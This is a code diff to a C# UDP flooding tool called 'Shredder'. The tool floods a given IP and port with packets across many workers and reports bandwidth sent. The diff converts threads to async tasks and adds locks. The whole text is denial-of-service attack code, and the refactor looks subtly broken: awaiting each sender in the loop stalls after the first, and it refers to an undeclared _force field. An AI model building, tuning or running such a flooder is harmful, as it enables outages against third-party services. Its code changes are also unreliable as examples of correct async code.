@@ -12,12 +12,13 @@ namespace Shredder
 
         private UdpClient _client;
         private byte[] _data;
-        private int _len;
 
         private bool _on;
         private long _sent;
         private double _total;
         public double Total { get { return _total; } }
+
+        private readonly object _lock = new object();
 
         public Shred(string ip, int port, int force, int threads)
         {
@@ -28,21 +29,20 @@ namespace Shredder
 
             _client = new UdpClient();
             _data = new byte[force];
-            _len = _data.Length;
         }
 
-        public void Flood()
+        public async Task FloodAsync()
         {
             _on = true;
             _sent = 0;
             for (int i = 0; i < _threads; i++)
             {
-                new Thread(Send).Start();
+                await Task.Run(SendAsync);
             }
-            new Thread(Info).Start();
+            await Task.Run(Info);
         }
 
-        public void Info()
+        private void Info()
         {
             double interval = 0.05;
             double now = GetTime();
@@ -64,8 +64,11 @@ namespace Shredder
 
                 if (size != 0)
                 {
-                    _total += _sent * bytediff / gb * interval;
-                    Console.Write($"\r{Stage($"{(int)Math.Round(Convert.ToDecimal(size))} Mb/s - Total: {Math.Round(_total, 1)} Gb.")}");
+                    lock (_lock)
+                    {
+                        _total += _sent * bytediff / gb * interval;
+                        Console.Write($"\r{Stage($"{(int)Math.Round(Convert.ToDecimal(size))} Mb/s - Total: {Math.Round(_total, 1)} Gb.")}");
+                    }
                 }
 
                 double now2 = GetTime();
@@ -75,40 +78,44 @@ namespace Shredder
                     continue;
                 }
 
-                size = (int)Math.Round(_sent * bytediff / mb);
-                _sent = 0;
+                lock (_lock)
+                {
+                    size = (int)Math.Round(_sent * bytediff / mb);
+                    _sent = 0;
+                }
 
                 now += 1;
             }
         }
-
-
-        private string Stage(string text, char symbol = '.')
-        {
-            return $" {symbol} {text}";
-        }
-
 
         public void Stop()
         {
             _on = false;
         }
 
-        public void Send()
+        private async Task SendAsync()
         {
             while (_on)
             {
                 try
                 {
                     IPEndPoint endPoint = (IPEndPoint)GetEndpoint();
-                    _client.Send(_data, _data.Length, endPoint);
-                    _sent += _len;
+                    await _client.SendAsync(_data, _data.Length, endPoint);
+                    lock (_lock)
+                    {
+                        _sent += _force;
+                    }
                 }
                 catch
                 {
                     // ignore
                 }
             }
+        }
+
+        private string Stage(string text, char symbol = '.')
+        {
+            return $" {symbol} {text}";
         }
 
         private EndPoint GetEndpoint()
